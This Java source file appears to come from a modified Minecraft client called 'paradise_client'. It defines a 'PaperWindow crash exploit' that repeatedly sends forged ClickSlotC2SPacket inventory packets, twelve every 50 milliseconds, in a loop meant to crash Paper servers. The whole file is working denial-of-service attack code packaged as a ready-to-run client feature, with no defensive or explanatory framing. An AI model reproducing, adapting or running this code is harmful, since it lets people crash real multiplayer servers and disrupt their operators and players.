package net.paradise_client.exploit.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.*;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.*;
import net.paradise_client.Helper;
import net.paradise_client.exploit.Exploit;

/**
 * This class represents a specific type of exploit that crashes the game by exploiting a PaperWindow bug. It sends a
 * flood of ClickSlotC2SPacket packets with forged slot data.
 * <p>
 * Updated for Minecraft 1.21.5+ using ItemStackHash and proper Int2ObjectMap format.
 *
 * @author SpigotRCE
 * @since 2.5
 */
public class PaperWindowExploit extends Exploit {

  public PaperWindowExploit(MinecraftClient minecraftClient) {
    super("paperwindow", "PaperWindow crash exploit", minecraftClient);
  }

  @Override public void execute() {
    new Thread(() -> {
      Helper.printChatMessage("[CrashExploit] [PaperWindow] Crashing...");

      try {
        ComponentChangesHash.ComponentHasher dummyHasher = (component) -> 0;

        // Create a hashed item stack for cursor and modifiedSlots
        ItemStack boat = new ItemStack(Items.ACACIA_BOAT);
        ItemStackHash hash = ItemStackHash.fromItemStack(boat, dummyHasher);

        Int2ObjectArrayMap<ItemStackHash> itemMap = new Int2ObjectArrayMap<>();
        itemMap.put(0, hash);

        while (isRunning()) {
          for (int i = 0; i < 12; i++) {
            assert getMinecraftClient().player != null;
            Helper.sendPacket(new ClickSlotC2SPacket(getMinecraftClient().player.currentScreenHandler.syncId,
              getMinecraftClient().player.currentScreenHandler.getRevision(),
              (short) 36,
              (byte) -1,
              SlotActionType.SWAP,
              itemMap,
              hash));
          }

          try {
            Thread.sleep(50);
          } catch (InterruptedException e) {
            Helper.printChatMessage("[CrashExploit] [PaperWindow] Unable to sleep 50ms");
          }
        }

      } catch (Exception e) {
        Helper.printChatMessage("[CrashExploit] [PaperWindow] Error: " + e.getMessage());
      }

    }, "PaperWindowThread").start();
  }
}
